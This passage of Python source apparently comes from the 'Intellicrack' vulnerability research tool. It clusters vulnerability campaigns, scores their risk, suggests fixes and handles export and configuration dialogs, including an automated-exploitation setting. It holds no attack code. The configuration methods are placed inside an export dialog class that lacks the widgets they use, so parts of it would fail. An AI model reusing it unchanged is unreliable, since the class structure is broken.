                    campaign.get("duration", 0) / 3600,  # Duration in hours
                    len(set(v.get("type", "") for v in vulns))  # Unique vulnerability types
                ])

                feature_vectors.append(features)
                campaign_metadata.append({
                    "id": campaign.get("id", "unknown"),
                    "name": campaign.get("name", "unnamed")
                })

            if len(feature_vectors) >= 2:
                # Perform clustering
                clusters = self._kmeans_clustering(feature_vectors, min(len(feature_vectors), 5))

                # Group campaigns by cluster
                clustered_campaigns = defaultdict(list)
                for i, cluster_id in enumerate(clusters):
                    clustered_campaigns[cluster_id].append({
                        "campaign": campaign_metadata[i],
                        "features": feature_vectors[i]
                    })

                # Analyze cluster characteristics
                for cluster_id, cluster_campaigns in clustered_campaigns.items():
                    characteristics = self._analyze_cluster_characteristics(
                        cluster_campaigns, vuln_categories
                    )
                    clustering_results["cluster_characteristics"][cluster_id] = characteristics

                    clustering_results["clusters"].append({
                        "id": cluster_id,
                        "campaigns": [cc["campaign"] for cc in cluster_campaigns],
                        "size": len(cluster_campaigns),
                        "characteristics": characteristics
                    })

                # Generate recommendations
                recommendations = self._generate_clustering_recommendations(clustering_results["clusters"])
                clustering_results["recommendations"] = recommendations

        except Exception as e:
            logger.error(f"Vulnerability clustering failed: {e}")

        return clustering_results

    def _categorize_vulnerability(self, vulnerability):
        """Categorize vulnerability into broad categories."""
        vuln_type = vulnerability.get("type", "").lower()
        vulnerability.get("description", "").lower()

        if "buffer" in vuln_type or "overflow" in vuln_type:
            return "buffer_overflow"
        elif any(term in vuln_type for term in ["injection", "sql", "xss", "command"]):
            return "injection"
        elif any(term in vuln_type for term in ["crypto", "encryption", "hash"]):
            return "crypto"
        elif any(term in vuln_type for term in ["auth", "permission", "access"]):
            return "auth"
        elif "race" in vuln_type or "toctou" in vuln_type:
            return "race_condition"
        elif any(term in vuln_type for term in ["memory", "free", "heap"]):
            return "memory_corruption"
        elif "logic" in vuln_type or "flaw" in vuln_type:
            return "logic_flaw"
        else:
            return "other"

    def _kmeans_clustering(self, data, k):
        """Simple k-means clustering implementation."""
        try:

            import numpy as np

            data = np.array(data)
            n_samples, n_features = data.shape

            # Initialize centroids randomly
            centroids = data[np.random.choice(n_samples, k, replace=False)]

            for _ in range(100):  # Max iterations
                # Assign points to closest centroid
                distances = np.sqrt(((data - centroids[:, np.newaxis])**2).sum(axis=2))
                cluster_assignments = np.argmin(distances, axis=0)

                # Update centroids
                new_centroids = np.array([data[cluster_assignments == i].mean(axis=0)
                                        for i in range(k)])

                # Check convergence
                if np.allclose(centroids, new_centroids):
                    break

                centroids = new_centroids

            return cluster_assignments.tolist()

        except Exception:
            # Fallback: simple grouping by total vulnerability count
            vuln_counts = [sum(features[:8]) for features in data]  # First 8 are category counts
            sorted_indices = sorted(range(len(vuln_counts)), key=lambda i: vuln_counts[i])

            cluster_size = len(data) // k
            clusters = []
            for i, _idx in enumerate(sorted_indices):
                cluster_id = min(i // cluster_size, k - 1)
                clusters.append(cluster_id)

            return clusters

    def _analyze_cluster_characteristics(self, cluster_campaigns, vuln_categories):
        """Analyze characteristics of a vulnerability cluster."""
        try:
            import numpy as np

            if not cluster_campaigns:
                return {}

            # Extract features for analysis
            all_features = [cc["features"] for cc in cluster_campaigns]
            feature_array = np.array(all_features)

            characteristics = {
                "dominant_vuln_types": [],
                "avg_severity": 0,
                "avg_campaign_duration": 0,
                "typical_vuln_count": 0,
                "risk_profile": "low"
            }

            # Analyze vulnerability type distribution
            vuln_type_means = feature_array[:, :len(vuln_categories)].mean(axis=0)
            top_indices = np.argsort(vuln_type_means)[-3:]  # Top 3 categories

            for idx in reversed(top_indices):
                if vuln_type_means[idx] > 0.1:  # Threshold for significance
                    characteristics["dominant_vuln_types"].append({
                        "type": vuln_categories[idx],
                        "average_count": round(vuln_type_means[idx], 2)
                    })

            # Calculate other characteristics
            characteristics["typical_vuln_count"] = int(feature_array[:, len(vuln_categories)].mean())
            characteristics["avg_severity"] = feature_array[:, len(vuln_categories) + 1].mean()
            characteristics["avg_campaign_duration"] = feature_array[:, len(vuln_categories) + 2].mean()

            # Determine risk profile
            if characteristics["avg_severity"] > 8:
                characteristics["risk_profile"] = "critical"
            elif characteristics["avg_severity"] > 6:
                characteristics["risk_profile"] = "high"
            elif characteristics["avg_severity"] > 3:
                characteristics["risk_profile"] = "medium"
            else:
                characteristics["risk_profile"] = "low"

            return characteristics

        except Exception as e:
            logger.error(f"Cluster analysis failed: {e}")
            return {}

    def _generate_clustering_recommendations(self, clusters):
        """Generate recommendations based on clustering analysis."""
        recommendations = []

        try:
            for cluster in clusters:
                characteristics = cluster["characteristics"]
                dominant_types = characteristics.get("dominant_vuln_types", [])
                risk_profile = characteristics.get("risk_profile", "low")

                if risk_profile in ["critical", "high"]:
                    recommendations.append({
                        "cluster_id": cluster["id"],
                        "priority": "high",
                        "recommendation": f"Immediate attention required for cluster {cluster['id']} with {risk_profile} risk profile",
                        "specific_actions": [
                            "Implement additional security controls",
                            "Increase monitoring frequency",
                            "Consider security architecture review"
                        ]
                    })

                if dominant_types:
                    top_type = dominant_types[0]["type"]
                    type_recommendations = {
                        "buffer_overflow": "Implement stack canaries and ASLR",
                        "injection": "Add input validation and parameterized queries",
                        "crypto": "Update to modern cryptographic standards",
                        "auth": "Review authentication and authorization mechanisms",
                        "race_condition": "Implement proper synchronization"
                    }

                    if top_type in type_recommendations:
                        recommendations.append({
                            "cluster_id": cluster["id"],
                            "priority": "medium",
                            "recommendation": f"Address {top_type} vulnerabilities in cluster {cluster['id']}",
                            "specific_actions": [type_recommendations[top_type]]
                        })

        except Exception as e:
            logger.error(f"Recommendation generation failed: {e}")

        return recommendations


class ExportResultsDialog(QDialog):
    """Dialog for selecting export options."""

    def __init__(self, campaign_results: dict, parent=None):
        """Initialize export results dialog.

        Args:
            campaign_results: Dictionary of campaign results to export
            parent: Parent widget

        """
        super().__init__(parent)
        self.setWindowTitle("Export Results")
        self.setMinimumSize(500, 400)
        self.campaign_results = campaign_results

        layout = QVBoxLayout(self)

        # Format selection
        format_group = QGroupBox("Export Format")
        format_layout = QVBoxLayout(format_group)

        self.format_combo = QComboBox()
        self.format_combo.addItems(["JSON", "CSV", "XML", "SQLite", "Archive (ZIP)"])
        format_layout.addWidget(self.format_combo)

        layout.addWidget(format_group)

        # Campaign selection
        campaign_group = QGroupBox("Select Campaigns")
        campaign_layout = QVBoxLayout(campaign_group)

        self.campaign_list = QListWidget()
        self.campaign_list.setSelectionMode(QListWidget.SelectionMode.MultiSelection)

        for campaign_id, results in campaign_results.items():
            item_text = f"{results.get('campaign_type', 'Unknown')} - {campaign_id[:8]} ({len(results.get('vulnerabilities', []))} vulns)"
            self.campaign_list.addItem(item_text)
            self.campaign_list.item(self.campaign_list.count() - 1).setData(
                Qt.UserRole, campaign_id
            )

        campaign_layout.addWidget(self.campaign_list)

        # Select all button
        select_all_btn = QPushButton("Select All")
        select_all_btn.clicked.connect(self._select_all)
        campaign_layout.addWidget(select_all_btn)

        layout.addWidget(campaign_group)

        # Options
        options_group = QGroupBox("Export Options")
        options_layout = QVBoxLayout(options_group)

        self.metadata_check = QCheckBox("Include Metadata")
        self.metadata_check.setChecked(True)
        options_layout.addWidget(self.metadata_check)

        self.raw_data_check = QCheckBox("Include Raw Data")
        self.raw_data_check.setChecked(False)
        options_layout.addWidget(self.raw_data_check)

        self.compress_check = QCheckBox("Compress Output")
        self.compress_check.setChecked(False)
        options_layout.addWidget(self.compress_check)

        layout.addWidget(options_group)

        # Buttons
        button_layout = QHBoxLayout()

        export_btn = QPushButton("Export")
        export_btn.clicked.connect(self.accept)
        button_layout.addWidget(export_btn)

        cancel_btn = QPushButton("Cancel")
        cancel_btn.clicked.connect(self.reject)
        button_layout.addWidget(cancel_btn)

        layout.addLayout(button_layout)

    def _select_all(self):
        """Select all campaigns."""
        for i in range(self.campaign_list.count()):
            self.campaign_list.item(i).setSelected(True)

    def get_selected_campaigns(self) -> dict[str, dict]:
        """Get selected campaign results."""
        selected = {}
        for item in self.campaign_list.selectedItems():
            campaign_id = item.data(Qt.UserRole)
            if campaign_id in self.campaign_results:
                selected[campaign_id] = self.campaign_results[campaign_id]
        return selected

    def _save_configuration(self):
        """Save configuration to file."""
        # Get current configuration
        config = self._get_current_configuration()

        # Get save path
        default_name = f"vuln_research_config_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Save Configuration",
            default_name,
            "JSON Files (*.json);;All Files (*)",
        )

        if not file_path:
            return

        try:
            import json

            # Add metadata
            config["metadata"] = {
                "saved_at": datetime.now().isoformat(),
                "version": "1.0",
                "application": "Intellicrack Vulnerability Research",
            }

            # Save configuration
            with open(file_path, "w", encoding="utf-8") as f:
                json.dump(config, f, indent=2)

            # Also save to default location
            self._save_default_config(config)

            logger.info(f"Configuration saved to: {file_path}")
            QMessageBox.information(
                self,
                "Success",
                f"Configuration saved successfully to:\n{file_path}",
            )

        except Exception as e:
            logger.error(f"Failed to save configuration: {e}")
            QMessageBox.critical(
                self,
                "Error",
                f"Failed to save configuration: {e!s}",
            )

    def _load_configuration(self):
        """Load configuration from file."""
        # Get load path
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Load Configuration",
            "",
            "JSON Files (*.json);;All Files (*)",
        )

        if not file_path:
            # Try to load default config
            default_config = self._load_default_config()
            if default_config:
                reply = QMessageBox.question(
                    self,
                    "Load Default",
                    "No file selected. Load default configuration?",
                    QMessageBox.Yes | QMessageBox.No,
                )

                if reply == QMessageBox.Yes:
                    self._apply_configuration(default_config)
            return

        try:
            import json

            # Load configuration
            with open(file_path, encoding="utf-8") as f:
                config = json.load(f)

            # Validate configuration
            if not self._validate_configuration(config):
                QMessageBox.warning(
                    self,
                    "Warning",
                    "Invalid configuration file format.",
                )
                return

            # Apply configuration
            self._apply_configuration(config)

            logger.info(f"Configuration loaded from: {file_path}")
            QMessageBox.information(
                self,
                "Success",
                "Configuration loaded successfully.",
            )

        except json.JSONDecodeError as e:
            logger.error(f"Invalid JSON in configuration file: {e}")
            QMessageBox.critical(
                self,
                "Error",
                "Invalid configuration file format.",
            )
        except Exception as e:
            logger.error(f"Failed to load configuration: {e}")
            QMessageBox.critical(
                self,
                "Error",
                f"Failed to load configuration: {e!s}",
            )

    def _reset_configuration(self):
        """Reset configuration to defaults."""
        reply = QMessageBox.question(
            self,
            "Confirm Reset",
            "Are you sure you want to reset all settings to defaults?\n\n"
            "This action cannot be undone.",
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No,
        )

        if reply != QMessageBox.Yes:
            return

        try:
            # Define default values
            defaults = {
                "research": {
                    "max_concurrent_campaigns": 5,
                    "default_timeout": 3600,
                    "storage_directory": os.path.join(tempfile.gettempdir(), "intellicrack_research"),
                    "auto_correlation": True,
                },
                "ml": {
                    "min_training_samples": 50,
                    "retrain_threshold": 100,
                    "confidence_threshold": 70,
                },
                "integration": {
                    "ai_integration": True,
                    "automated_exploitation": False,
                    "realtime_adaptation": True,
                },
            }

            # Apply defaults
            self._apply_configuration(defaults)

            # Clear any saved default config
            self._clear_default_config()

            # Clear campaign results and active campaigns
            if hasattr(self, "active_campaigns"):
                self.active_campaigns.clear()
            if hasattr(self, "campaign_results"):
                self.campaign_results.clear()

            # Refresh displays
            self._refresh_campaigns()
            self._refresh_results()

            logger.info("Configuration reset to defaults")
            QMessageBox.information(
                self,
                "Success",
                "Configuration has been reset to defaults.",
            )

        except Exception as e:
            logger.error(f"Failed to reset configuration: {e}")
            QMessageBox.critical(
                self,
                "Error",
                f"Failed to reset configuration: {e!s}",
            )

    def _get_current_configuration(self) -> dict:
        """Get current configuration from UI."""
        return {
            "research": {
                "max_concurrent_campaigns": self.max_campaigns_spin.value(),
                "default_timeout": self.timeout_spin.value(),
                "storage_directory": self.storage_dir_edit.text(),
                "auto_correlation": self.auto_correlation_check.isChecked(),
            },
            "ml": {
                "min_training_samples": self.min_samples_spin.value(),
                "retrain_threshold": self.retrain_threshold_spin.value(),
                "confidence_threshold": self.confidence_spin.value(),
            },
            "integration": {
                "ai_integration": self.ai_integration_check.isChecked(),
                "automated_exploitation": self.auto_exploitation_check.isChecked(),
                "realtime_adaptation": self.realtime_adaptation_check.isChecked(),
            },
            "ui_state": {
                "active_tab": self.tab_widget.currentIndex(),
                "window_geometry": {
                    "x": self.x(),
                    "y": self.y(),
                    "width": self.width(),
                    "height": self.height(),
                },
            },
        }

    def _apply_configuration(self, config: dict):
        """Apply configuration to UI."""
        try:
            # Research settings
            if "research" in config:
                research = config["research"]
                if "max_concurrent_campaigns" in research:
                    self.max_campaigns_spin.setValue(research["max_concurrent_campaigns"])
                if "default_timeout" in research:
                    self.timeout_spin.setValue(research["default_timeout"])
                if "storage_directory" in research:
                    self.storage_dir_edit.setText(research["storage_directory"])
                if "auto_correlation" in research:
                    self.auto_correlation_check.setChecked(research["auto_correlation"])

            # ML settings
            if "ml" in config:
                ml = config["ml"]
                if "min_training_samples" in ml:
                    self.min_samples_spin.setValue(ml["min_training_samples"])
                if "retrain_threshold" in ml:
                    self.retrain_threshold_spin.setValue(ml["retrain_threshold"])
                if "confidence_threshold" in ml:
                    self.confidence_spin.setValue(ml["confidence_threshold"])

            # Integration settings
            if "integration" in config:
                integration = config["integration"]
                if "ai_integration" in integration:
                    self.ai_integration_check.setChecked(integration["ai_integration"])
                if "automated_exploitation" in integration:
                    self.auto_exploitation_check.setChecked(integration["automated_exploitation"])
                if "realtime_adaptation" in integration:
                    self.realtime_adaptation_check.setChecked(integration["realtime_adaptation"])

            # UI state (optional)
            if "ui_state" in config:
                ui_state = config["ui_state"]
                if "active_tab" in ui_state:
                    self.tab_widget.setCurrentIndex(ui_state["active_tab"])
                if "window_geometry" in ui_state:
                    geo = ui_state["window_geometry"]
                    self.setGeometry(
                        geo.get("x", self.x()),
                        geo.get("y", self.y()),
                        geo.get("width", self.width()),
                        geo.get("height", self.height()),
                    )

            # Apply to research manager if available
            if self.research_manager:
                self._apply_config_to_manager(config)

        except Exception as e:
            logger.error(f"Failed to apply configuration: {e}")
            raise

    def _validate_configuration(self, config: dict) -> bool:
        """Validate configuration structure."""
        try:
            # Check required sections
            required_sections = ["research", "ml", "integration"]
            for section in required_sections:
                if section not in config:
                    logger.warning(f"Missing configuration section: {section}")
                    return False

            # Validate value ranges
            research = config.get("research", {})
            if "max_concurrent_campaigns" in research:
                if not 1 <= research["max_concurrent_campaigns"] <= 20:
                    return False

            ml = config.get("ml", {})
            if "confidence_threshold" in ml:
                if not 0 <= ml["confidence_threshold"] <= 100:
                    return False

            return True

        except Exception as e:
            logger.error(f"Configuration validation error: {e}")
            return False

    def _save_default_config(self, config: dict):
        """Save configuration to default location."""
        try:
            import os

            config_dir = os.path.expanduser("~/.intellicrack")
            os.makedirs(config_dir, exist_ok=True)

            config_file = os.path.join(config_dir, "vuln_research_config.json")

            import json

            with open(config_file, "w") as f:
                json.dump(config, f, indent=2)

            logger.info(f"Default configuration saved to: {config_file}")

        except Exception as e:
            logger.error(f"Failed to save default configuration: {e}")

    def _load_default_config(self) -> dict | None:
        """Load configuration from default location."""
        try:
            import os

            config_file = os.path.expanduser("~/.intellicrack/vuln_research_config.json")

            if not os.path.exists(config_file):
                return None

            import json

            with open(config_file) as f:
                return json.load(f)

        except Exception as e:
            logger.error(f"Failed to load default configuration: {e}")
            return None

    def _clear_default_config(self):
        """Clear default configuration file."""
        try:
            import os

            config_file = os.path.expanduser("~/.intellicrack/vuln_research_config.json")

            if os.path.exists(config_file):
                os.remove(config_file)
                logger.info("Default configuration cleared")

        except Exception as e:
            logger.error(f"Failed to clear default configuration: {e}")

    def _apply_config_to_manager(self, config: dict):
        """Apply configuration to research manager."""
        try:
            if not self.research_manager:
                return

            # Create manager config
            manager_config = {
                "max_concurrent_campaigns": config.get("research", {}).get(
                    "max_concurrent_campaigns", 5
                ),
                "default_timeout": config.get("research", {}).get("default_timeout", 3600),
                "storage_directory": config.get("research", {}).get(
                    "storage_directory", os.path.join(tempfile.gettempdir(), "intellicrack_research")
                ),
                "ml_config": {
                    "min_samples": config.get("ml", {}).get("min_training_samples", 50),
                    "confidence_threshold": config.get("ml", {}).get("confidence_threshold", 70)
                    / 100.0,
                },
            }

            # Apply to research manager
            self.research_manager.update_configuration(manager_config)

        except Exception as e:
            logger.error(f"Failed to apply config to manager: {e}")
